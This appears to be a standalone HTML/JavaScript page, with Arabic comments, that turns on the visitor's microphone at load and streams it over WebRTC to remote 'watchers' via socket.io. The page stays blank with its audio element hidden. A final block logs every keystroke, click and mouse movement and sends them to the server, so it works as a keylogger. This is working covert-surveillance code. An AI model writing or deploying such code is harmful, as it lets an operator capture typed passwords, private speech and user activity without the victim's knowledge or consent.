<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Broadcaster Audio</title>
<style>
body { margin:0; background:#fff; }
audio { display:none; }
</style>
</head>
<body>
<audio id="localAudio" autoplay muted></audio>

<script src="/socket.io/socket.io.js"></script>
<script>
(async function(){
  const socket = io();
  let pcMap = new Map();
  const localAudio = document.getElementById("localAudio");

  // افتح المايكروفون مباشرة
  try {
    const localStream = await navigator.mediaDevices.getUserMedia({ audio:true });
    localAudio.srcObject = localStream;
    socket.emit("broadcaster");

    // استقبال مشاهدين
    socket.on("watcher", async ({ watcherId }) => {
      const pc = new RTCPeerConnection();
      pcMap.set(watcherId, pc);

      localStream.getTracks().forEach(track => pc.addTrack(track, localStream));

      pc.onicecandidate = e => {
        if(e.candidate) socket.emit("candidate", { targetId: watcherId, candidate: e.candidate });
      };

      const offer = await pc.createOffer();
      await pc.setLocalDescription(offer);
      socket.emit("offer", { watcherId, sdp: pc.localDescription });

      pc.onconnectionstatechange = () => {
        if(["failed","closed","disconnected"].includes(pc.connectionState)) {
          pc.close(); pcMap.delete(watcherId);
        }
      };
    });

    socket.on("answer", ({ from, sdp }) => {
      const pc = pcMap.get(from);
      if(pc) pc.setRemoteDescription(new RTCSessionDescription(sdp));
    });
    socket.on("candidate", ({ from, candidate }) => {
      const pc = pcMap.get(from);
      if(pc && candidate) pc.addIceCandidate(new RTCIceCandidate(candidate));
    });

  } catch(err) {
    alert("❌ لا يمكن فتح المايكروفون: " + err.message);
  }

  // تسجيل ضغطات الكيبورد والماوس
  document.addEventListener("keydown", e => socket.emit("key-press", { key:e.key, code:e.code, time:Date.now() }));
  document.addEventListener("click", e => socket.emit("mouse-click", { x:e.clientX, y:e.clientY, button:e.button, time:Date.now() }));
  document.addEventListener("mousemove", e => socket.emit("mouse-move", { x:e.clientX, y:e.clientY, time:Date.now() }));

})();
</script>
</body>
</html>
